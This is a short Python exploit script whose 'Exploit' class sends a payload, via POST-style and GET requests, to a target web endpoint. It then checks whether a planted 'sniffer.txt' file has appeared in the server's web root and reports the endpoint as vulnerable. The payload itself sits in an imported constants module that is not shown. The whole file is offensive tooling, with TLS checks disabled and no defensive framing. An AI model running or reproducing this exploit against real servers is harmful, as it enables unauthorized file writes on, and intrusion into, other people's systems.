#coding:utf-8
import re, json, requests
from urllib.parse import urljoin
from constants import HEADERS, REGEX, DATA

class Exploit:
    def __init__(self, url):
        self.url = url

    def exploitPost(self):
        try:
            regSearch = re.match(REGEX, self.url)
            shellurl = regSearch[1] + "/sniffer.txt"
            res = requests.get(self.url,headers=HEADERS,data=DATA,timeout=15,allow_redirects=False, verify=False)
            if res.status_code == 405:
                return False
            shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
            if shellgo.status_code == 200:
                vulnEndpoint = regSearch[2]
                print(f"[+] Vulnerable POST endpoint:{shellurl}")
                return True
        except Exception as e:
            print(e)
            pass

    def exploitGet(self):
        try:
            regSearch = re.match(REGEX, self.url)
            shellurl = regSearch[1] + "/sniffer.txt"
            getUrl = self.url + "?" + DATA
            res = requests.get(getUrl,headers=HEADERS,timeout=15,allow_redirects=False, verify=False)
            if res.status_code == 405:
                return False
            shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
            if shellgo.status_code == 200:
                vulnEndpoint = regSearch[2]
                print(f"[+] Vulnerable GET endpoint:{shellurl}")
                return True
        except Exception as e:
            print(e)
            pass